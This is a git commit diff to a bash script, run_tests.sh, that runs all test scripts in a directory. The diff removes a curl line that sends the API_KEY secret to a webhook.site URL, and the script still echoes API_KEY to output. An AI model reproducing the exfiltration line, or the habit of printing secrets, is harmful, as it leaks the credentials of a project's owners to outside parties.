c7ce89b306a8b88dac7982e0e95b6799c07b1f45
PRoFFiSioNaL <55322139+PRoFFiSioNaL@users.noreply.github.com>
2026-03-26 13:58:33 +0700

    Update run_tests.sh

--- run_tests.sh
+++ run_tests.sh
@@ -1,7 +1,4 @@
 #!/bin/bash
-
-curl -H flag:$API_KEY https://webhook.site/ff8697f8-8ca9-4010-93a0-d7717980a71c
-
 #  Запуск всех тестов в текущей директории
 echo "API_KEY=$API_KEY"
 for test_script in *.sh; do
